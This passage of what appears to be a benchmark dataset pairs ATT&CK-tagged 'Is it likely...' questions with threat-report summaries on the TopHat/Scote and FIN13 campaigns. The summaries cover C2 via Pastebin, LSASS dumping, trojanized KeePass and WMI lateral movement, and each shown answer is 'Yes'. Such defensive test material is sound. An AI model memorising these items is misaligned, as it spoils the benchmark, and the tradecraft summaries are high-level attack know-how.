Command and Control: Scote malware retrieves C2 information from Pastebin postings or Google+ accounts. It uses this information to communicate with C2 servers and can accept commands to kill the malware, run 'ipconfig', run 'cmd.exe /C systeminfo', and load a DLL from a C2.
Others: The TopHat campaign overlaps with the previously reported DustySky campaign. The attacker tested their malware against multiple security products and submitted files that appear to be new variants of the DustySky Core malware. The campaign leveraged political events to target individuals or organizations within the Palestine region. Palo Alto Networks customers are protected by this threat through tagging in AutoFocus, flagging of malicious domains, marking samples as malicious within WildFire, and blocking exploits used by the RTF files. Google, Pastebin, and bit.ly have been notified of the malicious content hosted on their services.",Yes,unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services
1870,336,336-Command and Control-T1102-Web Service,"After Scote malware employs various techniques to evade detection using legitimate third-party online services to host its C2 information, is it likely that it retrieves C2 information from Pastebin postings or Google+ accounts before communicating with C2 servers to accept commands?","Command and Control: Scote malware retrieves C2 information from Pastebin postings or Google+ accounts. It uses this information to communicate with C2 servers and can accept commands to kill the malware, run 'ipconfig', run 'cmd.exe /C systeminfo', and load a DLL from a C2.","Initial Access: In the TopHat campaign, attackers used Arabic language decoy documents related to current events within the Palestine Territories to entice victims. The attacks were deployed via malicious RTF files, self-extracting Windows executables, and RAR archives. The RTF files made HTTP requests to a bit.ly URL, which redirected to a malicious site. The self-extracting executables loaded a decoy document and spawned an instance of Scote malware.
Execution: The Scote malware family, once executed, provides backdoor access for an attacker. It collects command and control (C2) information from Pastebin links and Google+ profiles. The bit.ly links obscured the C2 URLs, preventing victims from evaluating the legitimacy of the final site.
Defense Evasion: Scote malware employs various techniques to evade detection, including the use of legitimate third-party online services to host its C2 information. The malware uses a series of techniques and tricks when loaded onto a victim machine, including layers of obfuscation.
Others: The TopHat campaign overlaps with the previously reported DustySky campaign. The attacker tested their malware against multiple security products and submitted files that appear to be new variants of the DustySky Core malware. The campaign leveraged political events to target individuals or organizations within the Palestine region. Palo Alto Networks customers are protected by this threat through tagging in AutoFocus, flagging of malicious domains, marking samples as malicious within WildFire, and blocking exploits used by the RTF files. Google, Pastebin, and bit.ly have been notified of the malicious content hosted on their services.",Yes,unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services
1872,337,337-Reconnaissance-T1590-Gather Victim Network Information,"After FIN13 has exploited external servers to deploy web shells and custom malware like BLUEAGAVE and SIXPACK for Initial Access, is it likely that Mandiant will track FIN13 as a threat actor involved in gathering victim network information during the Reconnaissance phase before the group employs JSPRAT for local command execution and network traffic proxying during Execution?","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.","Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1875,337,337-Initial Access-T1190-Exploit Public-Facing Application,"After FIN13 uses utilities such as ProcDump to dump LSASS process memory and executes passive backdoors like BLUEAGAVE for command execution, is it likely FIN13 exploits external servers and deploys web shells to establish initial access into victim networks?","Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1877,337,337-Persistence-T1554-Compromise Client Software Binary,"After employing JSPRAT for local command execution and leveraging BLUEAGAVE for HTTP-based command execution, is FIN13 likely to replace KeePass binaries with trojanized versions to ensure persistence before using tools like Mimikatz and ProcDump to escalate privileges?","Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1878,337,337-Credential Access-T1003-OS Credential Dumping,Is it likely that FIN13 will gather information on network and host configurations using native OS binaries for reconnaissance before dumping LSASS process memory to obtain credentials for their operations?,Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1879,337,337-Credential Access-T1040-Network Sniffing,"After using trojanized KeePass binaries to log newly entered passwords during privilege escalation, is FIN13 likely to employ network sniffing to obtain credentials before leveraging native OS binaries and custom malware to gather network and host configuration details for internal reconnaissance?",Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1881,337,337-Lateral Movement-T1021-Remote Services,"After leveraging native OS binaries and custom malware for internal reconnaissance during discovery, is it likely that FIN13 will use tools like Invoke-WMIExec and custom web shells such as BUSTEDPIPE for lateral movement via remote services before collecting data from network shared drives and targeting specific information for fraudulent transactions?","Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1882,337,337-Command and Control-T1090-Proxy,"After collecting sensitive data from network shared drives and archiving it locally or remotely using utilities and libraries, is FIN13 likely to use proxies for communication and command and control before exfiltrating the data over web services with tools like web shells and JSP tools?","Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1883,337,337-Command and Control-T1105-Ingress Tool Transfer,"After leveraging tools like Invoke-WMIExec and custom web shells like BUSTEDPIPE for cross-platform lateral movement, is FIN13 likely to transfer tools into the environment for Command and Control using techniques such as ingress tool transfer?","Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1884,337,337-Command and Control-T1132-Data Encoding,"After collecting data from network shared drives and archiving it for fraudulent transactions, is FIN13 likely to encode data to support its communication for command and control operations before exfiltrating it over web services using web shells and JSP tools?","Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1885,337,337-Execution-T1059-Command and Scripting Interpreter,"After FIN13 exploits external servers to deploy web shells and custom malware for initial access, is it likely that they will employ passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports for listening to incoming HTTP requests and command execution, before using other methods to establish persistence with tools like SIXPACK and trojanized KeePass binaries?","Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
